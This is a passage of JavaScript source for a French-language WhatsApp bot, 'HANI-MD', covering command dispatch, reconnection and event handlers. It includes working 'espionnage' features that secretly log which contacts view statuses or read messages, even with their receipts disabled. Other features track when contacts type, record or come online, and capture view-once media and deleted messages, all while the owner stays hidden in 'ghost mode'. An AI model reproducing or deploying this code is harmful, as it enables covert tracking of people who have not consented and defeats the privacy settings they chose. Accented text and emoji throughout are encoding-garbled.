        text += `â€¢ \`.gencodes <plan> <nb>\` - GÃ©nÃ©rer plusieurs\n`;
        text += `â€¢ \`.listcodes\` - Voir codes disponibles\n`;
        text += `â€¢ \`.addpremium @user <plan>\` - Ajouter premium\n`;
        text += `â€¢ \`.delpremium @user\` - Retirer premium\n`;
        text += `â€¢ \`.premiumlist\` - Liste des premium\n`;
        text += `â€¢ \`.premiumstats\` - Statistiques\n`;
      }
      
      return send(text);
    }

    default: {
      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
      // ðŸ”Œ EXÃ‰CUTION DES COMMANDES MODULAIRES (OVLCMD)
      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
      
      // Chercher la commande dans le systÃ¨me ovlcmd
      const ovlCommand = findCommand(command);
      
      if (ovlCommand) {
        console.log(`[OVLCMD] ðŸ“¦ ExÃ©cution de la commande modulaire: ${command}`);
        
        // ðŸ•µï¸ MODE FURTIF: Wrapper pour ovl.sendMessage
        // Redirige TOUS les messages vers "Moi-mÃªme" (botNumber)
        const stealthOvl = {
          ...hani,
          sendMessage: async (jid, content, options = {}) => {
            // Toujours envoyer vers botNumber (Moi-mÃªme)
            console.log(`[STEALTH] ðŸ“¤ Redirection: ${jid} â†’ ${botNumber}`);
            return await hani.sendMessage(botNumber, content, options);
          }
        };
        
        // PrÃ©parer les options pour ovlcmd - COMPLET avec toutes les variables attendues
        const cmdOptions = {
          // Arguments
          arg: args ? args.split(" ").filter(a => a) : [],
          args: args || "",
          texte: args || "",
          
          // Message et rÃ©ponse
          ms: msg,
          repondre: reply,
          send: send,
          
          // ExpÃ©diteur
          sender: sender,
          from: from,
          auteur_Msg: sender,
          autession: sender,
          
          // Permissions utilisateur
          isOwner: isOwner,
          isSudo: isSudo,
          superUser: isOwner || isSudo,
          
          // Permissions groupe
          verif_Groupe: isGroupMsg,
          isGroupMsg: isGroupMsg,
          verif_Admin: isAdmin,
          isAdmin: isAdmin,
          admin_Groupe: isBotAdmin,
          isBotAdmin: isBotAdmin,
          
          // MÃ©tadonnÃ©es groupe
          groupMetadata: groupMetadata,
          infosGroupe: groupMetadata,
          
          // Mentions et citations
          mentioned: mentioned,
          mentionedJid: mentioned,
          quotedMsg: quotedMsg,
          quotedParticipant: quotedParticipant,
          
          // Config
          prefix: config.PREFIXE,
          prefixe: config.PREFIXE,
          command: command,
          nomAuteur: config.NOM_OWNER || "HANIEL",
          
          // Bot info
          botNumber: botNumber,
          
          // Source originale (pour contexte)
          sourceChat: from,
          sourceInfo: sourceInfo
        };
        
        try {
          // Utiliser directement hani pour préserver les méthodes WhatsApp
          await executeCommand(command, hani, msg, cmdOptions);
          console.log(`[OVLCMD] âœ… Commande ${command} exÃ©cutÃ©e`);
        } catch (err) {
          console.error(`[OVLCMD] âŒ Erreur commande ${command}:`, err.message);
          await send(`âŒ Erreur lors de l'exÃ©cution de la commande: ${err.message}`);
        }
        return;
      }
      
      // Commande non trouvÃ©e - ne pas rÃ©pondre
      console.log(`[CMD] âš ï¸ Commande inconnue: ${command}`);
      return;
    }
  }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸš€ DÃ‰MARRAGE DU BOT
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

let hani = null;

// ðŸ”’ ParamÃ¨tres de reconnexion ULTRA STABLE
const RECONNECT_CONFIG = {
  maxAttempts: 50,           // 50 tentatives max
  baseDelay: 1500,           // DÃ©lai initial 1.5s (plus rapide)
  maxDelay: 120000,          // Max 2 minutes (pas 5)
  multiplier: 1.3,           // Exponential backoff plus doux
  jitter: 0.2                // 20% de variation
};

// ðŸ”„ Ping keep-alive pour maintenir la connexion active
let keepAliveInterval = null;
let connectionHealthCheck = null;

function calculateReconnectDelay(attempt) {
  const baseDelay = Math.min(
    RECONNECT_CONFIG.baseDelay * Math.pow(RECONNECT_CONFIG.multiplier, attempt),
    RECONNECT_CONFIG.maxDelay
  );
  const jitter = baseDelay * RECONNECT_CONFIG.jitter * (Math.random() * 2 - 1);
  return Math.floor(baseDelay + jitter);
}

// ðŸ”’ Verrou anti-reconnexion multiple
let isReconnecting = false;

async function startBot() {
  // Ã‰viter les reconnexions multiples simultanÃ©es
  if (isReconnecting) {
    console.log('[!] Reconnexion dÃ©jÃ  en cours, ignorÃ©...');
    return;
  }
  isReconnecting = true;

  // ðŸ›‘ Fermer proprement l'ancienne connexion si elle existe
  if (hani) {
    try {
      console.log('[...] Fermeture de l\'ancienne connexion...');
      hani.ev.removeAllListeners();
      if (hani.ws) {
        hani.ws.close();
      }
      await delay(1000);
    } catch (e) {
      // Ignorer les erreurs de fermeture
    }
  }

  console.log(`
+-----------------------------------------------------------+
|                                                           |
|              * HANI-MD V2.6.0 SECURE *                    |
|         Bot WhatsApp Intelligent par H2025                |
|            ðŸ”’ SÃ©curitÃ© RenforcÃ©e ActivÃ©e                  |
|                                                           |
+-----------------------------------------------------------+
|  [QR] Scanne le QR code avec WhatsApp                       |
|  [CFG]  PrÃ©fixe: ${config.PREFIXE.padEnd(42)}|
|  [OWNER] Owner: ${config.NOM_OWNER.padEnd(44)}|
+-----------------------------------------------------------+
`);

  // CrÃ©er les dossiers nÃ©cessaires
  if (!fs.existsSync("./DataBase")) {
    fs.mkdirSync("./DataBase", { recursive: true });
  }

  // Restaurer la session depuis SESSION_ID si disponible
  if (config.SESSION_ID) {
    await restoreSessionFromId();
  }
  
  // CrÃ©er le dossier session si nÃ©cessaire
  if (!fs.existsSync(SESSION_FOLDER)) {
    fs.mkdirSync(SESSION_FOLDER, { recursive: true });
  }

  const { state, saveCreds } = await useMultiFileAuthState(SESSION_FOLDER);

  // ðŸ”’ Compteur de reconnexion amÃ©liorÃ©
  let reconnectAttempts = 0;
  const MAX_RECONNECT_ATTEMPTS = RECONNECT_CONFIG.maxAttempts;
  let isConnected = false;
  let lastBackupTime = Date.now();

  // Sauvegarder les credentials immÃ©diatement et rÃ©guliÃ¨rement
  const saveCredsWrapper = async () => {
    try {
      await saveCreds();
      console.log("[SAVE] Session sauvegardÃ©e");
      
      // ðŸ”’ CrÃ©er un backup sÃ©curisÃ© toutes les heures
      if (securityManager && Date.now() - lastBackupTime > 60 * 60 * 1000) {
        try {
          await securityManager.createBackup();
          lastBackupTime = Date.now();
          console.log("[BACKUP] âœ… Backup automatique crÃ©Ã©");
        } catch (e) {}
      }
    } catch (e) {
      console.log("âš ï¸ Erreur sauvegarde session:", e.message);
    }
  };

  // ðŸ›‘ Nettoyer les anciens intervals si existants
  if (keepAliveInterval) clearInterval(keepAliveInterval);
  if (connectionHealthCheck) clearInterval(connectionHealthCheck);

  hani = makeWASocket({
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
    },
    logger: pino({ level: "silent" }),
    browser: ["HANI-MD", "Chrome", "2.6.0"],
    keepAliveIntervalMs: 30000,          // 30s - intervalle standard
    markOnlineOnConnect: false,          // Ne pas marquer en ligne automatiquement
    generateHighQualityLinkPreview: false,
    syncFullHistory: false,
    retryRequestDelayMs: 2000,            // 2s entre les retry
    connectTimeoutMs: 60000,              // 1min timeout
    defaultQueryTimeoutMs: 60000,         // 1min query timeout
    emitOwnEvents: true,
    fireInitQueries: true,
    qrTimeout: 60000,                     // 1min pour scanner QR
    printQRInTerminal: false,
    // âš ï¸ NE PAS ignorer status@broadcast pour intercepter les statuts
    getMessage: async (key) => {
      return { conversation: "" };
    },
  });

  // ðŸ”“ LibÃ©rer le verrou aprÃ¨s crÃ©ation du socket
  isReconnecting = false;

  // ðŸš« SUPPRIMÃ‰: keepAlive qui causait des conflits de session
  // Le keepAliveIntervalMs de Baileys gÃ¨re dÃ©jÃ  le ping automatiquement

  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ã‰VÃ‰NEMENTS DE CONNEXION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  hani.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr) {
      reconnectAttempts = 0; // Reset quand on affiche le QR
      
      // Stocker le QR pour l'affichage web
      qrState.currentQR = qr;
      qrState.lastUpdate = Date.now();
      qrState.connectionStatus = "waiting_qr";
      qrState.qrCount++;
      
      // GÃ©nÃ©rer le QR en image base64 pour le web
      try {
        qrState.qrDataURL = await qrcodeWeb.toDataURL(qr, {
          width: 300,
          margin: 2,
          color: { dark: "#000000", light: "#ffffff" }
        });
      } catch (e) {
        console.log("âš ï¸ Erreur gÃ©nÃ©ration QR image:", e.message);
      }
      
      console.log("\n[QR] SCANNE CE QR CODE AVEC WHATSAPP:\n");
      qrcode.generate(qr, { small: true });
      console.log("\n[WAIT] Tu as 60 secondes pour scanner...");
      console.log(`[WEB] Ou va sur: http://localhost:${process.env.PORT || 3000}/qr\n`);
    }

    if (connection === "connecting") {
      qrState.connectionStatus = "connecting";
      console.log("[...] Connexion en cours...");
    }

    if (connection === "open") {
      isConnected = true;
      qrState.isConnected = true;
      qrState.connectionStatus = "connected";
      qrState.currentQR = null;
      qrState.qrDataURL = null;
      
      const botNumber = hani.user?.id?.split(":")[0] || "";
      const botName = hani.user?.name || "HANI-MD";
      const botJid = botNumber + "@s.whatsapp.net";
      
      qrState.botInfo = {
        name: botName,
        number: botNumber,
        jid: botJid,
        connectedAt: new Date().toISOString()
      };
      
      // ðŸ¤– ENREGISTRER LE BOT (celui qui a scannÃ© le QR)
      // ATTENTION: Le bot n'est PAS l'owner ! L'owner est dÃ©fini dans .env (NUMERO_OWNER)
      if (botNumber) {
        // Enregistrer le bot dans la base de donnÃ©es comme "bot" (pas owner!)
        if (!db.data.users[botJid]) {
          db.data.users[botJid] = {
            name: botName,
            role: "bot", // Le bot n'est PAS owner, c'est juste le bot
            messageCount: 0,
            firstSeen: new Date().toISOString(),
            lastSeen: new Date().toISOString(),
            isBot: true
          };
        } else {
          db.data.users[botJid].name = botName;
          db.data.users[botJid].isBot = true;
          // Ne pas changer le role si dÃ©jÃ  dÃ©fini
        }
        db.save();
        console.log(`[DB] ðŸ¤– Bot enregistrÃ©: ${botName} (${botNumber})`);
        console.log(`[DB] ðŸ‘‘ Owner dÃ©fini dans .env: ${config.NUMERO_OWNER}`);
      }
      
      reconnectAttempts = 0;
      
      // Sauvegarder immÃ©diatement aprÃ¨s connexion rÃ©ussie
      await saveCredsWrapper();
      
      // Sauvegarder encore aprÃ¨s 2 secondes pour Ãªtre sÃ»r
      setTimeout(async () => {
        await saveCredsWrapper();
      }, 2000);
      
      // Sauvegarder pÃ©riodiquement toutes les 5 minutes
      setInterval(async () => {
        if (isConnected) {
          await saveCredsWrapper();
        }
      }, 5 * 60 * 1000);
      
      console.log(`
+-----------------------------------------------------------+
|              [OK] HANI-MD CONNECTÃ‰ !                        |
+-----------------------------------------------------------+
|  [BOT] Bot: ${(hani.user?.name || "HANI-MD").padEnd(47)}|
|  [QR] NumÃ©ro: ${(hani.user?.id?.split(":")[0] || "").padEnd(44)}|
|  [CFG]  PrÃ©fixe: ${config.PREFIXE.padEnd(42)}|
|  [WEB] Mode: ${config.MODE.padEnd(46)}|
+-----------------------------------------------------------+
|  [SHIELD] PROTECTIONS AUTOMATIQUES ACTIVÃ‰ES:                   |
|    [OK] Anti-delete messages                                |
|    [OK] Vue unique photos/vidÃ©os                            |
|    [OK] Ã‰coute unique vocaux                                |
|    [OK] Sauvegarde automatique statuts                      |
|    [OK] Anti-suppression statuts                            |
|    [OK] Anti-appel                                          |
|    [OK] Anti-bot (bloque autres bots)                       |
+-----------------------------------------------------------+
|  [TIP] Tape ${config.PREFIXE}menu pour voir les commandes              |
|  [MSG] Tout est envoyÃ© automatiquement dans "Moi-mÃªme"       |
+-----------------------------------------------------------+
`);
      db.data.stats.startTime = Date.now();
      db.save();
      
      // ðŸ”” Envoyer notification de connexion dans "Moi-mÃªme"
      try {
        const botJid = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
        console.log(`[DEBUG] Envoi notification connexion Ã : ${botJid}`);
        await hani.sendMessage(botJid, {
          text: `âœ… *HANI-MD CONNECTÃ‰ !*
          
ðŸ¤– Bot: ${hani.user?.name || "HANI-MD"}
ðŸ“± NumÃ©ro: +${hani.user?.id?.split(":")[0]}
âš™ï¸ PrÃ©fixe: ${config.PREFIXE}
ðŸ• ConnectÃ© le: ${new Date().toLocaleString("fr-FR")}

ðŸ›¡ï¸ *NOTIFICATIONS AUTOMATIQUES:*
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ðŸ“– T'a Ã©crit â†’ âœ… ACTIF
ðŸ“– Message lu par â†’ âœ… ACTIF  
ðŸ‘ï¸ Statut vu par â†’ âœ… ACTIF
ðŸ•µï¸ PrÃ©sence dÃ©tectÃ©e â†’ âœ… ACTIF
ðŸ—‘ï¸ Message supprimÃ© â†’ âœ… ACTIF
ðŸ“¸ Vue unique interceptÃ©e â†’ âœ… ACTIF
ðŸŽ¤ Vocal Ã©coute unique â†’ âœ… ACTIF
ðŸ“º Statut supprimÃ© â†’ âœ… ACTIF
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ðŸ“µ Appel rejetÃ© â†’ ðŸ”‡ Actif seulement en mode invisible
   âžœ Tape *${config.PREFIXE}invisible on* pour activer

ðŸ’¡ Toutes les notifications arrivent ici automatiquement!
ðŸ“ Tape *${config.PREFIXE}menu* pour les commandes`
        });
        console.log("[OK] Notification de connexion envoyÃ©e dans Moi-mÃªme");
      } catch (e) {
        console.log("[!] Erreur envoi notification connexion:", e.message);
      }
      
      // 👻 DÉMARRER LE MODE INVISIBLE AUTOMATIQUEMENT
      try {
        spyConfig.ghostMode = true;
        spyConfig.ghostModeAdvanced.hideOnline = true;
        spyConfig.ghostModeAdvanced.hideTyping = true;
        spyConfig.ghostModeAdvanced.hideRead = true;
        spyConfig.ghostModeAdvanced.hideRecording = true;
        startGhostMode(hani);
        await hani.sendPresenceUpdate("unavailable");
        console.log("[OK] 👻 Mode INVISIBLE activé automatiquement");
      } catch (e) {
        console.log("[!] Erreur activation mode invisible:", e.message);
      }
    }

    if (connection === "close") {
      isConnected = false;
      qrState.isConnected = false;
      qrState.connectionStatus = "disconnected";
      qrState.botInfo = null;
      
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const reason = lastDisconnect?.error?.message || "Inconnue";

      console.log(`\n[!] DÃ©connexion (code: ${statusCode}, raison: ${reason})`);

      // ðŸ”’ DÃ©tecter si c'est un VRAI conflit de session (mot "conflict" explicite)
      // "Stream Errored" seul n'est PAS un conflit, c'est souvent un restart normal
      const isConflict = (reason.toLowerCase().includes("conflict") && !reason.toLowerCase().includes("restart")) ||
                         statusCode === 440;
      
      // Conflit de session RÃ‰EL - NE PAS reconnecter automatiquement
      if (isConflict) {
        console.log("[âš ï¸] CONFLIT DE SESSION DÃ‰TECTÃ‰!");
        console.log("[!] Une autre instance du bot tourne probablement ailleurs.");
        console.log("[TIP] VÃ©rifications Ã  faire:");
        console.log("     1. Ferme WhatsApp Web dans tous les navigateurs");
        console.log("     2. VÃ©rifie si le bot tourne sur un serveur (Heroku, Railway, etc.)");
        console.log("     3. VÃ©rifie les appareils connectÃ©s sur WhatsApp mobile");
        console.log("[STOP] Le bot va s'arrÃªter pour Ã©viter les conflits.");
        console.log("[CMD] RedÃ©marre manuellement avec: pm2 restart hani");
        isReconnecting = false;
        return;
      }
      
      // RedÃ©marrage requis par WhatsApp (515, 408, ou "restart required")
      if (statusCode === 515 || statusCode === 408 || reason.toLowerCase().includes("restart")) {
        console.log("[ðŸ”„] RedÃ©marrage requis par WhatsApp...");
        isReconnecting = false;
        await delay(2000);
        startBot();
        return;
      }
      
      // Session vraiment expirÃ©e (401) - nouveau QR requis
      if (statusCode === DisconnectReason.loggedOut || statusCode === 401) {
        console.log("[X] Session expirÃ©e. Suppression et nouveau QR...");
        if (fs.existsSync(SESSION_FOLDER)) {
          fs.rmSync(SESSION_FOLDER, { recursive: true, force: true });
          console.log("[OK] Session supprimÃ©e.");
        }
        reconnectAttempts = 0;
        isReconnecting = false;
        await delay(3000);
        startBot();
      } 
      // 428 = Connection Closed - Reconnecter SANS supprimer la session
      else if (statusCode === 428) {
        console.log("[ðŸ”„] Connection fermÃ©e temporairement (428)");
        reconnectAttempts++;
        if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
          const waitTime = Math.min(3000 * reconnectAttempts, 20000); // Max 20s
          console.log(`[...] Reconnexion dans ${(waitTime/1000).toFixed(1)}s (tentative ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS})`);
          isReconnecting = false;
          await delay(waitTime);
          startBot();
        } else {
          // AprÃ¨s plusieurs Ã©checs, supprimer et demander nouveau QR
          console.log("[X] Ã‰checs rÃ©pÃ©tÃ©s. Nouveau QR code requis...");
          if (fs.existsSync(SESSION_FOLDER)) {
            fs.rmSync(SESSION_FOLDER, { recursive: true, force: true });
          }
          reconnectAttempts = 0;
          isReconnecting = false;
          await delay(3000);
          startBot();
        }
      }
      // ðŸ”’ Autres erreurs - reconnexion avec exponential backoff
      else {
        reconnectAttempts++;
        if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
          const waitTime = calculateReconnectDelay(reconnectAttempts);
          console.log(`[ðŸ”„] Tentative ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS} dans ${(waitTime/1000).toFixed(1)}s...`);
          isReconnecting = false;
          await delay(waitTime);
          startBot();
        } else {
          console.log("[X] Maximum de tentatives atteint. Pause de 2 minutes...");
          reconnectAttempts = 0;
          isReconnecting = false;
          await delay(2 * 60 * 1000);
          startBot();
        }
      }
    }
  });

  hani.ev.on("creds.update", saveCredsWrapper);

  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ï¸ ESPIONNAGE: QUI VOIT MES STATUTS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  // Capturer TOUTES les vues de statuts (mÃªme avec confirmations dÃ©sactivÃ©es)
  hani.ev.on("message-receipt.update", async (updates) => {
    try {
      console.log(`ðŸ“¨ [RECEIPT] ${updates.length} mise(s) Ã  jour reÃ§ue(s)`);
      if (!protectionState.spyStatusViews) {
        console.log(`ðŸ‘ï¸ [STATUT] spyStatusViews dÃ©sactivÃ©`);
        return;
      }
      
      for (const update of updates) {
        const { key, receipt } = update;
        console.log(`ðŸ“¨ [RECEIPT] key.remoteJid=${key.remoteJid}, fromMe=${key.fromMe}`);
        
        // VÃ©rifier si c'est un statut (status@broadcast)
        if (key.remoteJid === "status@broadcast" && key.fromMe) {
          // Quelqu'un a vu MON statut
          const viewerJid = receipt.userJid;
          const viewerNumber = viewerJid?.split("@")[0];
          const viewerName = getContactName(viewerJid) || null;
          const timestamp = receipt.readTimestamp ? receipt.readTimestamp * 1000 : Date.now();
          const readTime = new Date(timestamp).toLocaleString("fr-FR");
          const formattedPhone = formatPhoneForDisplay(viewerNumber);
          
          console.log(`ðŸ‘ï¸ [STATUT VU] ${viewerNumber} a vu ton statut`);
          
          // Stocker dans spyData
          spyData.statusViews.unshift({
            viewer: viewerNumber,
            viewerName: viewerName,
            viewerJid: viewerJid,
            timestamp: timestamp,
            timeStr: readTime
          });
          
          // Limiter le nombre d'entrÃ©es
          if (spyData.statusViews.length > spyData.maxEntries) {
            spyData.statusViews = spyData.statusViews.slice(0, spyData.maxEntries);
          }
          
          // Envoyer notification Ã  moi-mÃªme
          const botJid = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
          
          // ðŸ†• Utiliser getContactInfo pour avoir le nom enregistrÃ©
          const contactInfo = getContactInfo(viewerJid);
          
          await hani.sendMessage(botJid, {
            text: `ðŸ‘ï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    *QUELQU'UN A VU TON STATUT*
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ðŸ‘¤ *Contact:* ${contactInfo}
ðŸ“ *Nom WA:* ${viewerName || "Non enregistrÃ©"}
ðŸ“± *NumÃ©ro:* ${formattedPhone}
ðŸ• *Heure:* ${readTime}

ðŸ“ž *Appelle:* wa.me/${viewerNumber}
ðŸ’¬ *Ã‰cris:* wa.me/${viewerNumber}

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ðŸ’¡ _.spy_ pour voir tout le monde`
          });
          
          console.log(`ðŸ‘ï¸ [STATUT VU] ${viewerName || viewerNumber} (${formattedPhone}) a vu ton statut`);
        }
      }
    } catch (e) {
      // Silencieux en cas d'erreur
    }
  });

  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ“– ESPIONNAGE: QUI LIT MES MESSAGES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  // Capturer les confirmations de lecture (mÃªme dÃ©sactivÃ©es cÃ´tÃ© destinataire)
  const processedReadReceipts = new Set(); // Anti-doublon pour confirmations de lecture
  hani.ev.on("messages.update", async (updates) => {
    try {
      console.log(`ðŸ“– [MSG UPDATE] ${updates.length} mise(s) Ã  jour reÃ§ue(s)`);
      for (const update of updates) {
        const { key, update: msgUpdate } = update;
        console.log(`ðŸ“– [MSG UPDATE] fromMe=${key.fromMe}, status=${msgUpdate?.status}`);
        
        // Si c'est mon message et il a Ã©tÃ© lu
        if (key.fromMe && msgUpdate.status === 4) { // status 4 = read/lu
          console.log(`ðŸ“– [MESSAGE LU] DÃ©tectÃ©: ${key.remoteJid}`);
          // ðŸ”’ ANTI-DOUBLON: VÃ©rifier si dÃ©jÃ  traitÃ©
          const readKey = `${key.id}_${key.remoteJid}`;
          if (processedReadReceipts.has(readKey)) {
            console.log(`ðŸ“– [MESSAGE LU] Doublon ignorÃ©`);
            continue;
          }
          processedReadReceipts.add(readKey);
          // Nettoyer le cache si trop grand
          if (processedReadReceipts.size > 500) {
            const iter = processedReadReceipts.values();
            for (let i = 0; i < 100; i++) processedReadReceipts.delete(iter.next().value);
          }
          
          const recipientJid = key.remoteJid;
          
          // Ignorer les groupes et status@broadcast pour cette notification
          if (recipientJid?.includes("@g.us") || recipientJid === "status@broadcast") continue;
          
          const recipientNumber = recipientJid?.split("@")[0];
          
          // âš ï¸ IGNORER LES LID (Linked ID) - ce ne sont pas de vrais numÃ©ros
          if (isLID(recipientNumber)) {
            console.log(`ðŸ“– [IGNORÃ‰] LID dÃ©tectÃ©, pas un vrai numÃ©ro: ${recipientNumber}`);
            continue;
          }
          
          const recipientName = getContactName(recipientJid) || null;
          const timestamp = Date.now();
          const readTime = new Date(timestamp).toLocaleString("fr-FR");
          const formattedPhone = formatPhoneForDisplay(recipientNumber);
          
          // Stocker dans spyData
          spyData.messageReads.unshift({
            reader: recipientNumber,
            readerName: recipientName,
            readerJid: recipientJid,
            timestamp: timestamp,
            timeStr: readTime
          });
          
          // Limiter le nombre d'entrÃ©es
          if (spyData.messageReads.length > spyData.maxEntries) {
            spyData.messageReads = spyData.messageReads.slice(0, spyData.maxEntries);
          }
          
          // Envoyer notification si activÃ©
          if (protectionState.spyReadReceipts) {
            // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
            const contactInfo = getContactInfo(recipientJid);
            
            console.log(`ðŸ“– [LECTURE] Envoi notification vers ${NOTIFICATION_NUMBER}`);
            
            try {
              await hani.sendMessage(NOTIFICATION_NUMBER, {
                text: `ðŸ“– â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    *MESSAGE LU PAR*
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ðŸ‘¤ *Contact:* ${contactInfo}
ðŸ“ *Nom WA:* ${recipientName || "Non enregistrÃ©"}
ðŸ• *Lu Ã :* ${readTime}

ðŸ“ž *Appelle:* wa.me/${recipientNumber}
ðŸ’¬ *Ã‰cris:* wa.me/${recipientNumber}

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•`
              });
              console.log(`âœ… [LECTURE] Notification envoyÃ©e vers ${NOTIFICATION_NUMBER}!`);
            } catch (readErr) {
              console.log(`âŒ [LECTURE] Erreur: ${readErr.message}`);
            }
          }
          
          console.log(`ðŸ“– [MESSAGE LU] ${recipientName || recipientNumber} (${formattedPhone}) a lu ton message`);
        }
      }
    } catch (e) {
      // Silencieux en cas d'erreur
    }
  });

  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ GESTION DES CONTACTS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  // Mettre en cache les noms des contacts pour les utiliser dans les messages
  hani.ev.on("contacts.upsert", (contacts) => {
    for (const contact of contacts) {
      const jid = contact.id;
      const name = contact.name || contact.notify || contact.verifiedName;
      if (jid && name) {
        cacheContactName(jid, name);
        console.log(`ðŸ“‡ Contact mis en cache: ${name} (${jid.split("@")[0]})`);
      }
    }
  });

  hani.ev.on("contacts.update", (updates) => {
    for (const update of updates) {
      const jid = update.id;
      const name = update.name || update.notify || update.verifiedName;
      if (jid && name) {
        cacheContactName(jid, name);
      }
    }
  });

  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ•µï¸ DÃ‰TECTION DE PRÃ‰SENCE (QUELQU'UN ENTRE DANS VOTRE CHAT) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  // DÃ©tecte quand quelqu'un est en train d'Ã©crire ou est actif dans une discussion privÃ©e
  hani.ev.on("presence.update", async (presenceData) => {
    try {
      if (!protectionState.spyPresence) return;
      
      const { id: chatJid, presences } = presenceData;
      const botNumber = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
      
      // Ignorer les groupes et les statuts
      if (!chatJid || chatJid.endsWith("@g.us") || chatJid === "status@broadcast") return;
      
      // Parcourir les prÃ©sences dÃ©tectÃ©es
      for (const [participantJid, presence] of Object.entries(presences || {})) {
        // Ignorer ma propre prÃ©sence
        if (participantJid === botNumber || participantJid.split("@")[0] === hani.user?.id?.split(":")[0]) {
          continue;
        }
        
        // DÃ©tecter si quelqu'un est actif (composing = en train d'Ã©crire, paused = vient de s'arrÃªter d'Ã©crire)
        const lastKnownPresence = presence?.lastKnownPresence;
        
        // Ã‰vÃ©nements intÃ©ressants : "composing" (Ã©crit), "recording" (enregistre vocal), "available" (en ligne dans le chat)
        if (lastKnownPresence === "composing" || lastKnownPresence === "recording" || lastKnownPresence === "available") {
          
          const participantNumber = participantJid.split("@")[0];
          
          // âš ï¸ IGNORER LES LID (Linked ID) - ce ne sont pas de vrais numÃ©ros
          if (isLID(participantNumber)) {
            console.log(`ðŸ•µï¸ [IGNORÃ‰] LID dÃ©tectÃ© dans prÃ©sence: ${participantNumber}`);
            continue;
          }
          
          const cooldownKey = `${participantNumber}_${lastKnownPresence}`;
          const now = Date.now();
          
          // Cooldown de 10 minutes par personne et par type d'action pour Ã©viter le spam
          const lastNotified = spyData.presenceCooldown[cooldownKey] || 0;
          if (now - lastNotified < 10 * 60 * 1000) {
            continue; // DÃ©jÃ  notifiÃ© rÃ©cemment
          }
          
          // Marquer comme notifiÃ©
          spyData.presenceCooldown[cooldownKey] = now;
          
          // Formater le numÃ©ro pour affichage
          const formattedPhone = formatPhoneForDisplay ? formatPhoneForDisplay(participantNumber) : `+${participantNumber}`;
          // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
          const contactInfo = getContactInfo(participantJid);
          const contactName = getCachedContactName(participantJid) || "Inconnu";
          const detectTime = new Date(now).toLocaleString("fr-FR");
          
          // DÃ©terminer l'action
          let actionText, actionEmoji;
          switch (lastKnownPresence) {
            case "composing":
              actionText = "est en train d'Ã©crire";
              actionEmoji = "âœï¸";
              break;
            case "recording":
              actionText = "enregistre un vocal";
              actionEmoji = "ðŸŽ¤";
              break;
            case "available":
              actionText = "est en ligne dans votre chat";
              actionEmoji = "ðŸ‘ï¸";
              break;
            default:
              actionText = "est actif";
              actionEmoji = "ðŸ“±";
          }
          
          // Enregistrer la dÃ©tection
          spyData.presenceDetected.push({
            participant: participantJid,
            number: participantNumber,
            name: contactName,
            action: lastKnownPresence,
            timestamp: now
          });
          
          // Limiter la taille de l'historique
          if (spyData.presenceDetected.length > spyData.maxEntries) {
            spyData.presenceDetected = spyData.presenceDetected.slice(-spyData.maxEntries);
          }
          
          // Envoyer notification Ã  moi-mÃªme (botNumber)
          console.log(`ðŸ‘ï¸ [PRESENCE] Envoi notification vers ${botNumber}`);
          
          const notificationMsg = `â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘   ðŸ‘ï¸ PRÃ‰SENCE DÃ‰TECTÃ‰E ðŸ‘ï¸   â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘ ${actionEmoji} Quelqu'un ${actionText}!
